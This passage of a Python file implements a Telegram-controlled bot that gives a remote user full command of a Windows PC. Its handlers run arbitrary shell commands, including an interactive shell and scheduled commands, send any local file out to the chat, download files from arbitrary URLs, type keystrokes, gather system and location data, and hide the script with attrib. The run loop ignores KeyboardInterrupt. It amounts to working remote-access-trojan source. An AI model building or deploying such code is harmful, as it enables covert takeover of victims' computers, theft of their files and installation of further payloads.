    bot.send_message(message.chat.id, f"Opened {url} in Chrome")

@bot.message_handler(commands=['edge'])
@authenticated
def edge_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/edge', 1)[1].strip()
    os.system(f'start msedge "{url}"')
    bot.send_message(message.chat.id, f"Opened {url} in Edge")

@bot.message_handler(commands=['firefox'])
@authenticated
def firefox_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/firefox', 1)[1].strip()
    os.system(f'start firefox "{url}"')
    bot.send_message(message.chat.id, f"Opened {url} in Firefox")

@bot.message_handler(commands=['textspeech'])
@authenticated
def textspeech_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/textspeech', 1)[1].strip()
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()
    bot.send_message(message.chat.id, "Speaking completed")

@bot.message_handler(commands=['say'])
@authenticated
def say_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/say', 1)[1].strip()
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()
    bot.send_message(message.chat.id, "Speech completed")

@bot.message_handler(commands=['playsound'])
@authenticated
def playsound_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/playsound', 1)[1].strip()
    os.startfile(path)
    bot.send_message(message.chat.id, "Playing sound")

@bot.message_handler(commands=['download'])
@authenticated
def download_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/download', 1)[1].strip()
    with open(path, 'rb') as file:
        if path.endswith(('.png', '.jpg', '.jpeg', '.gif')):
            bot.send_photo(message.chat.id, file)
        elif path.endswith(('.mp4', '.avi', '.mkv')):
            bot.send_video(message.chat.id, file)
        else:
            bot.send_document(message.chat.id, file)

@bot.message_handler(commands=['upload'])
@authenticated
def upload_command(message: telebot.types.Message) -> None:
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Send your file:")

@bot.message_handler(commands=['uploadfile'])
@authenticated
def upload_file_command(message: telebot.types.Message) -> None:
    try:
        path: str = message.text.split('/uploadfile', 1)[1].strip()
        if not os.path.exists(path):
            bot.send_message(message.chat.id, "File not found")
            return
        
        with open(path, 'rb') as f:
            if path.endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp')):
                bot.send_photo(message.chat.id, f)
            elif path.endswith(('.mp4', '.avi', '.mkv', '.mov')):
                bot.send_video(message.chat.id, f)
            elif path.endswith(('.mp3', '.wav', '.ogg')):
                bot.send_audio(message.chat.id, f)
            else:
                bot.send_document(message.chat.id, f)
        bot.send_message(message.chat.id, f"Uploaded: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
@authenticated
def handle_upload(message: telebot.types.Message) -> None:
    global waiting_for_upload
    if waiting_for_upload:
        try:
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                file_name = message.document.file_name
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
                file_name = f"photo_{int(time.time())}.jpg"
            else:
                bot.send_message(message.chat.id, "Send document or photo")
                waiting_for_upload = False
                return
                
            downloaded = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as f:
                f.write(downloaded)
            bot.send_message(message.chat.id, f"Saved: {file_name}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
        finally:
            waiting_for_upload = False

@bot.message_handler(commands=['files'])
@authenticated
def list_files(message: telebot.types.Message) -> None:
    try:
        items: list[str] = os.listdir('.')
        response: str = f"Current Directory: {os.getcwd()}\n\n"
        
        dirs: list[str] = []
        files: list[str] = []
        
        for item in items:
            if os.path.isdir(item):
                dirs.append(f"[DIR] {item}")
            else:
                size: int = os.path.getsize(item)
                if size < 1024:
                    size_str: str = f"{size}B"
                elif size < 1048576:
                    size_str: str = f"{size/1024:.1f}KB"
                else:
                    size_str: str = f"{size/1048576:.1f}MB"
                files.append(f"[FILE] {item} ({size_str})")
        
        response += "\n".join(dirs[:20] + files[:30])
        
        if len(response) > 4000:
            response = response[:4000]
        bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['cd'])
@authenticated
def change_directory(message: telebot.types.Message) -> None:
    global current_directory
    try:
        path: str = message.text.split('/cd', 1)[1].strip()
        if path == '..':
            os.chdir('..')
        else:
            os.chdir(path)
        current_directory = os.getcwd()
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    except FileNotFoundError:
        bot.send_message(message.chat.id, "Directory not found")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['delete'])
@authenticated
def delete_item(message: telebot.types.Message) -> None:
    try:
        path: str = message.text.split('/delete', 1)[1].strip()
        if os.path.isfile(path):
            os.remove(path)
            bot.send_message(message.chat.id, f"Deleted file: {path}")
        elif os.path.isdir(path):
            shutil.rmtree(path)
            bot.send_message(message.chat.id, f"Deleted directory: {path}")
        else:
            bot.send_message(message.chat.id, f"Not found: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['rename'])
@authenticated
def rename_item(message: telebot.types.Message) -> None:
    try:
        parts: list[str] = message.text.split('/rename', 1)[1].strip().split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Usage: /rename oldname newname")
            return
        old_name: str = parts[0]
        new_name: str = parts[1]
        os.rename(old_name, new_name)
        bot.send_message(message.chat.id, f"Renamed: {old_name} -> {new_name}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['mkdir'])
@authenticated
def make_directory(message: telebot.types.Message) -> None:
    try:
        dirname: str = message.text.split('/mkdir', 1)[1].strip()
        os.makedirs(dirname, exist_ok=True)
        bot.send_message(message.chat.id, f"Created directory: {dirname}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['rmdir'])
@authenticated
def remove_directory(message: telebot.types.Message) -> None:
    try:
        dirname: str = message.text.split('/rmdir', 1)[1].strip()
        os.rmdir(dirname)
        bot.send_message(message.chat.id, f"Removed directory: {dirname}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['search'])
@authenticated
def search_files(message: telebot.types.Message) -> None:
    try:
        pattern: str = message.text.split('/search', 1)[1].strip()
        bot.send_message(message.chat.id, f"Searching for '{pattern}'...")
        
        results: list[str] = []
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                if pattern.lower() in file.lower():
                    path: str = os.path.join(root, file)
                    try:
                        size: int = os.path.getsize(path)
                        size_str: str = f"{size/1024:.1f}KB" if size < 1048576 else f"{size/1048576:.1f}MB"
                        results.append(f"{file} ({size_str})\n  Location: {path[:80]}")
                        if len(results) >= 20:
                            break
                    except:
                        pass
            if len(results) >= 20:
                break
        
        if results:
            response: str = "Found files:\n\n" + "\n".join(results)
            bot.send_message(message.chat.id, response[:4000])
        else:
            bot.send_message(message.chat.id, "No files found")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['downloadurl'])
@authenticated
def download_from_url(message: telebot.types.Message) -> None:
    try:
        parts: list[str] = message.text.split()
        if len(parts) < 2:
            bot.send_message(message.chat.id, "Usage: /downloadurl <url> [filename]")
            return
        
        url: str = parts[1]
        filename: str = parts[2] if len(parts) > 2 else url.split('/')[-1]
        
        bot.send_message(message.chat.id, f"Downloading from {url}...")
        response = requests.get(url, stream=True, timeout=30)
        
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        bot.send_message(message.chat.id, f"Downloaded: {filename}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['zip'])
@authenticated
def create_zip(message: telebot.types.Message) -> None:
    try:
        folder: str = message.text.split('/zip', 1)[1].strip()
        zip_name: str = f"{folder}.zip"
        shutil.make_archive(folder, 'zip', folder)
        bot.send_message(message.chat.id, f"Created archive: {zip_name}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['unzip'])
@authenticated
def extract_zip(message: telebot.types.Message) -> None:
    try:
        zip_file: str = message.text.split('/unzip', 1)[1].strip()
        extract_path: str = zip_file.replace('.zip', '')
        with zipfile.ZipFile(zip_file, 'r') as zip_ref:
            zip_ref.extractall(extract_path)
        bot.send_message(message.chat.id, f"Extracted to: {extract_path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['processes'])
@authenticated
def detailed_processes(message: telebot.types.Message) -> None:
    try:
        processes: list[dict] = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                processes.append(proc.info)
            except:
                pass
        
        top_cpu: list[dict] = sorted(processes, key=lambda x: x['cpu_percent'], reverse=True)[:15]
        response: str = "Top Processes by CPU Usage:\n\n"
        
        for p in top_cpu:
            response += f"{p['name']} (PID: {p['pid']})\n"
            response += f"  CPU: {p['cpu_percent']:.1f}% | RAM: {p['memory_percent']:.1f}%\n\n"
        
        bot.send_message(message.chat.id, response[:4000])
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['killpid'])
@authenticated
def kill_by_pid(message: telebot.types.Message) -> None:
    try:
        pid: int = int(message.text.split('/killpid', 1)[1].strip())
        process = psutil.Process(pid)
        process.terminate()
        bot.send_message(message.chat.id, f"Terminated process: {process.name()} (PID: {pid})")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['e'])
@authenticated
def e_command(message: telebot.types.Message) -> None:
    global current_directory
    cmd: str = message.text.split('/e', 1)[1].strip()
    if cmd == 'cd..':
        current_directory = os.path.dirname(current_directory)
        os.chdir(current_directory)
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    elif cmd.startswith('cd '):
        new_dir: str = cmd.split(' ', 1)[1].strip()
        os.chdir(new_dir)
        current_directory = os.getcwd()
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    else:
        result: str = os.popen(cmd).read()
        bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['ex'])
@authenticated
def ex_command(message: telebot.types.Message) -> None:
    cmd: str = message.text.split('/ex', 1)[1].strip()
    result: str = os.popen(cmd).read()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    if len(chunks) > 1:
        with open('output.txt', 'w', encoding='utf-8') as f:
            f.write(result)
        with open('output.txt', 'rb') as f:
            bot.send_document(message.chat.id, f)
        os.remove('output.txt')
    else:
        bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['execute'])
@authenticated
def execute_command(message: telebot.types.Message) -> None:
    global execute_session
    execute_session = True
    bot.send_message(message.chat.id, "Interactive shell. Type 'exit' to quit.")

@bot.message_handler(func=lambda m: execute_session and m.chat.id in AUTH_USERS)
def execute_shell(message: telebot.types.Message) -> None:
    global execute_session, current_directory
    cmd: str = message.text.strip()
    if cmd.lower() == 'exit':
        execute_session = False
        bot.send_message(message.chat.id, "Exited shell")
    elif cmd == 'cd..':
        current_directory = os.path.dirname(current_directory)
        os.chdir(current_directory)
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    elif cmd.startswith('cd '):
        new_dir: str = cmd.split(' ', 1)[1].strip()
        try:
            os.chdir(new_dir)
            current_directory = os.getcwd()
            bot.send_message(message.chat.id, f"Now in: {current_directory}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        result: str = os.popen(cmd).read()
        bot.send_message(message.chat.id, result[:4000] if result else "Command executed")

@bot.message_handler(commands=['metadata'])
@authenticated
def metadata_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/metadata', 1)[1].strip()
    if os.path.exists(path):
        stat_info = os.stat(path)
        info: str = f"Size: {stat_info.st_size} bytes\nModified: {time.ctime(stat_info.st_mtime)}\nCreated: {time.ctime(stat_info.st_ctime)}"
        bot.send_message(message.chat.id, info)
    else:
        bot.send_message(message.chat.id, "File not found")

@bot.message_handler(commands=['keytype'])
@authenticated
def keytype_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/keytype', 1)[1].strip()
    pyautogui.write(text)
    bot.send_message(message.chat.id, f"Typed: {text}")

@bot.message_handler(commands=['keypress'])
@authenticated
def keypress_command(message: telebot.types.Message) -> None:
    key: str = message.text.split('/keypress', 1)[1].strip()
    pyautogui.press(key)
    bot.send_message(message.chat.id, f"Pressed: {key}")

@bot.message_handler(commands=['keypresstwo'])
@authenticated
def keypresstwo_command(message: telebot.types.Message) -> None:
    keys: list[str] = message.text.split('/keypresstwo', 1)[1].strip().split()
    pyautogui.hotkey(keys[0], keys[1])
    bot.send_message(message.chat.id, f"Pressed {keys[0]}+{keys[1]}")

@bot.message_handler(commands=['keypressthree'])
@authenticated
def keypressthree_command(message: telebot.types.Message) -> None:
    keys: list[str] = message.text.split('/keypressthree', 1)[1].strip().split()
    pyautogui.hotkey(keys[0], keys[1], keys[2])
    bot.send_message(message.chat.id, f"Pressed {keys[0]}+{keys[1]}+{keys[2]}")

@bot.message_handler(commands=['hide'])
@authenticated
def hide_command(message: telebot.types.Message) -> None:
    script_path: str = os.path.abspath(__file__)
    os.system(f'attrib +h "{script_path}"')
    bot.send_message(message.chat.id, "Script hidden")

@bot.message_handler(commands=['unhide'])
@authenticated
def unhide_command(message: telebot.types.Message) -> None:
    script_path: str = os.path.abspath(__file__)
    os.system(f'attrib -h "{script_path}"')
    bot.send_message(message.chat.id, "Script unhidden")

@bot.message_handler(commands=['info'])
@authenticated
def info_command(message: telebot.types.Message) -> None:
    try:
        ip: str = requests.get('https://api.ipify.org', timeout=5).text
        geo: dict = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        info_text: str = f"IP: {ip}\nCity: {geo.get('city', 'N/A')}\nRegion: {geo.get('regionName', 'N/A')}\nCountry: {geo.get('country', 'N/A')}\nISP: {geo.get('isp', 'N/A')}"
        bot.send_message(message.chat.id, info_text)
    except:
        bot.send_message(message.chat.id, "Could not fetch location info")

@bot.message_handler(commands=['pcinfo'])
@authenticated
def pcinfo_command(message: telebot.types.Message) -> None:
    try:
        ps_script = """
        $computer = Get-CimInstance Win32_ComputerSystem
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
        Write-Output "$($computer.Name)|$($os.Caption)|$($cpu.Name)|$($cpu.NumberOfCores)|$($computer.TotalPhysicalMemory/1GB)"
        """
        result = subprocess.run(['powershell', '-Command', ps_script], 
                              capture_output=True, text=True, timeout=10)
        if result.stdout:
            parts = result.stdout.strip().split('|')
            info: str = f"Hostname: {parts[0]}\nOS: {parts[1]}\nCPU: {parts[2]}\nCores: {parts[3]}\nRAM: {float(parts[4]):.0f} GB"
            bot.send_message(message.chat.id, info)
            return
    except:
        pass

    hostname: str = platform.node()
    system: str = platform.system()
    release: str = platform.release()
    processor: str = platform.processor()
    cpu_count: int = os.cpu_count()
    ram_info = os.popen('wmic computersystem get TotalPhysicalMemory').read().strip().split('\n')[1].strip()
    ram_gb: int = int(int(ram_info) / (1024**3)) if ram_info.isdigit() else 0
    info: str = f"Hostname: {hostname}\nOS: {system} {release}\nCPU: {processor}\nCores: {cpu_count}\nRAM: {ram_gb} GB"
    bot.send_message(message.chat.id, info)

@bot.message_handler(commands=['sysinfo'])
@authenticated
def system_info(message: telebot.types.Message) -> None:
    try:
        cpu_percent: float = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('C:\\')
        battery = psutil.sensors_battery()
        uptime: str = get_system_uptime()
        
        battery_percent: str = f"{battery.percent}%" if battery else "No Battery"
        charging_status: str = "Yes" if battery and battery.power_plugged else "No" if battery else "N/A"
        
        info: str = f"""
System Information:
==================
CPU: {platform.processor()}
CPU Usage: {cpu_percent}%
CPU Cores: {os.cpu_count()}

RAM Total: {memory.total / (1024**3):.1f} GB
RAM Used: {memory.used / (1024**3):.1f} GB
RAM Usage: {memory.percent}%

Disk C: Total: {disk.total / (1024**3):.1f} GB
Disk C: Free: {disk.free / (1024**3):.1f} GB
Disk C: Usage: {disk.percent}%

Battery: {battery_percent}
Charging: {charging_status}

OS: {platform.system()} {platform.release()}
Uptime: {uptime}
"""
        bot.send_message(message.chat.id, info[:4000])
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['uptime'])
@authenticated
def uptime_command(message: telebot.types.Message) -> None:
    uptime: str = get_system_uptime()
    bot.send_message(message.chat.id, f"System Uptime: {uptime}")

@bot.message_handler(commands=['shortinfo'])
@authenticated
def shortinfo_command(message: telebot.types.Message) -> None:
    user: str = os.getenv('USERNAME', 'Unknown')
    pc: str = platform.node()
    os_ver: str = platform.version()[:50]
    info: str = f"User: {user}\nPC: {pc}\nOS: {os_ver}"
    bot.send_message(message.chat.id, info)

@bot.message_handler(commands=['apps'])
@authenticated
def apps_command(message: telebot.types.Message) -> None:
    result: str = os.popen('wmic product get Name, Version').read().strip()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    for chunk in chunks[:5]:
        bot.send_message(message.chat.id, f"Installed Apps:\n{chunk}")

@bot.message_handler(commands=['batteryinfo'])
@authenticated
def batteryinfo_command(message: telebot.types.Message) -> None:
    try:
        percent: str = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip().split('\n')[1].strip()
        status: str = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip().split('\n')[1].strip()
        status_map: dict[str, str] = {'1': 'Discharging', '2': 'Charging', '3': 'Fully Charged'}
        bot.send_message(message.chat.id, f"Battery: {percent}%\nStatus: {status_map.get(status, 'Unknown')}")
    except:
        bot.send_message(message.chat.id, "No battery found")

@bot.message_handler(commands=['schedule'])
@authenticated
def schedule_command(message: telebot.types.Message) -> None:
    global scheduled_timers
    parts: list[str] = message.text.split('/schedule', 1)[1].strip().split(' ', 1)
    if len(parts) < 2:
        bot.send_message(message.chat.id, "Usage: /schedule <seconds> <command>")
        return
    
    try:
        delay: int = int(parts[0])
        command: str = parts[1]
        
        def execute_scheduled():
            result = os.popen(command).read()
            bot.send_message(message.chat.id, f"Scheduled command result:\n{result[:4000] if result else 'Command executed'}")
            for timer in scheduled_timers[:]:
                if not timer.is_alive():
                    scheduled_timers.remove(timer)
        
        timer = threading.Timer(delay, execute_scheduled)
        timer.daemon = True
        timer.start()
        scheduled_timers.append(timer)
        
        bot.send_message(message.chat.id, f"Command scheduled in {delay} seconds (ID: {id(timer)})")
    except ValueError:
        bot.send_message(message.chat.id, "Invalid delay time")

@bot.message_handler(commands=['listschedules'])
@authenticated
def list_schedules(message: telebot.types.Message) -> None:
    global scheduled_timers
    scheduled_timers = [t for t in scheduled_timers if t.is_alive()]
    
    if not scheduled_timers:
        bot.send_message(message.chat.id, "No active scheduled commands")
        return
    
    response = f"Active schedules ({len(scheduled_timers)}):\n\n"
    for i, timer in enumerate(scheduled_timers, 1):
        response += f"{i}. Timer ID: {id(timer)}\n"
    bot.send_message(message.chat.id, response[:4000])

@bot.message_handler(commands=['clearschedules'])
@authenticated
def clear_schedules(message: telebot.types.Message) -> None:
    global scheduled_timers
    count = len([t for t in scheduled_timers if t.is_alive()])
    
    for timer in scheduled_timers:
        if timer.is_alive():
            timer.cancel()
    scheduled_timers.clear()
    
    bot.send_message(message.chat.id, f"Cancelled {count} scheduled commands")

def run_bot() -> None:
    while True:
        try:
            bot.polling(none_stop=True, interval=1, timeout=30)
        except KeyboardInterrupt:
            continue
        except:
            time.sleep(10)

if __name__ == '__main__':
    run_bot()
